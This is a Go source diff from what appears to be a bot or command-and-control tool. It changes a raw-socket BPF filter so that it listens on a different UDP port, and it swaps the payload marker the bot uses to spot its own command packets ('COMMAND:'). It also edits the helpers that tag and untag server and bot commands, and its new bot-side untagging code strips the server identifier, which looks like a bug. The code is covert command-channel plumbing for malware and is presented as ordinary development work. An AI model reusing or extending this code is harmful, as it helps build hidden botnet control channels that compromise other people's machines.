@@ -36,9 +36,9 @@ var FilterRaw = []bpf.RawInstruction{
 	{0x30, 0, 0, 0x00000014},
 	{0x15, 0, 15, 0x00000011},
 	{0x28, 0, 0, 0x00000036},
-	{0x15, 12, 0, 0x0000e290},
+	{0x15, 12, 0, 0x0000de89},
 	{0x28, 0, 0, 0x00000038},
-	{0x15, 10, 11, 0x0000e290},
+	{0x15, 10, 11, 0x0000de89},
 	{0x15, 0, 10, 0x00000800},
 	{0x30, 0, 0, 0x00000017},
 	{0x15, 0, 8, 0x00000011},
@@ -46,9 +46,9 @@ var FilterRaw = []bpf.RawInstruction{
 	{0x45, 6, 0, 0x00001fff},
 	{0xb1, 0, 0, 0x0000000e},
 	{0x48, 0, 0, 0x0000000e},
-	{0x15, 2, 0, 0x0000e290},
+	{0x15, 2, 0, 0x0000de89},
 	{0x48, 0, 0, 0x00000010},
-	{0x15, 0, 1, 0x0000e290},
+	{0x15, 0, 1, 0x0000de89},
 	{0x6, 0, 0, 0x00040000},
 	{0x6, 0, 0, 0x00000000},
 }
@@ -183,7 +183,7 @@ func BotReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
 		// Make sure this is my packet
-		if strings.Contains(string(packet.ApplicationLayer().Payload()), "cHNvdmF5YQ") {
+		if strings.Contains(string(packet.ApplicationLayer().Payload()), "COMMAND:") {
 			return packet
 		}
 		return nil
@@ -458,18 +458,18 @@ func CreateDeploy(link string, pname string) (command string) {
 
 func AddIdentifier(cmd string, forServer bool) (command string) {
 	if forServer {
-		command = ServerIdentifier + command
+		command = ServerIdentifier + cmd
 		return command
 	}
-	command = BotIdentifier + command
+	command = BotIdentifier + cmd
 	return command
 }
 
 func RemoveIdentifier(data string, forServer bool) (command string) {
 	if forServer {
-		newData := strings.Trim(data, ServerIdentifier)
+		newData := strings.Replace(data, ServerIdentifier, "", 1)
 		return newData
 	}
-	newData := strings.Trim(data, BotIdentifier)
+	newData := strings.Replace(data, ServerIdentifier, "", 1)
 	return newData
 }
